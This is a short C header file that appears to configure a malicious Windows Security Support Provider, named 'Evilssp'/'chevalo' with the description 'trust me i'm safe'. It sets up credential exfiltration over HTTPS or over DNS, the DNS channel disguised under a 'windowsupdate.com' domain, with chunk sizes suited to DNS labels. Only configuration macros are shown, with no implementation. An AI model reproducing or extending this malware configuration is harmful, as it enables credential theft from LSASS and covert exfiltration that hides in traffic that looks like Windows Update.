#pragma once
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <winsock2.h>
#include <windows.h>
#include <sspi.h>
#include <ntsecapi.h>
#include <ntsecpkg.h>
#include <stdio.h>
#include "utils.h"
#include "dns.h"
#include "https.h"

#define HTTPS_EXFILTRATION 1
#define HTTPS_ENDPOINT L"127.0.0.1"
#define USERAGENT L"Evilssp"

#define SSP_NAME L"chevalo"
#define SSP_COMMENT L"chevalo trust me i'm safe"

#define DNS_EXFILTRATION 0
#define TLD "windowsupdate.com"
#define IP "192.168.0.21"


#define SIZE_CHUNK 63
#define BUFFER_SIZE 4096
